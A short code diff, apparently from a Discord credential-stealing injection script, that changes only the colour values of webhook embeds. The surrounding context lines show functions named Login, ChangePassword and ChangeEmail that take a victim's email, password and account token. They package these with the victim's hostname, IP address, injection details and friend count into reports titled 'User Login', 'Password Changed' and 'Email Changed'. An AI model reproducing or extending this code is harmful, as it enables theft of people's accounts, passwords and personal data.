@@ -242,7 +242,7 @@ function Login(email, password, token) {
                         content: "",
                         embeds: [{
                             "title": "User Login",
-                            "color": 3447704,
+                            "color": 1510255,
                             "fields": [{
                                 name: "Info",
                                 value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
@@ -291,7 +291,7 @@ function Login(email, password, token) {
                             }
                         }, {
                             "title": `Total Friends (${totalFriends()})`,
-                            "color": 3447704,
+                            "color": 1510255,
                             "description": CalcFriends(),
                             "author": {
                                 "name": "FruitPealler"
@@ -356,7 +356,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                     content: "",
                     embeds: [{
                         "title": "Password Changed",
-                        "color": 3447704,
+                        "color": 1510255,
                         "fields": [{
                             name: "Info",
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
@@ -460,7 +460,7 @@ function ChangeEmail(newemail, password, token) {
                     content: "",
                     embeds: [{
                         "title": "Email Changed",
-                        "color": 3447704,
+                        "color": 1510255,
                         "fields": [{
                             name: "Info",
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
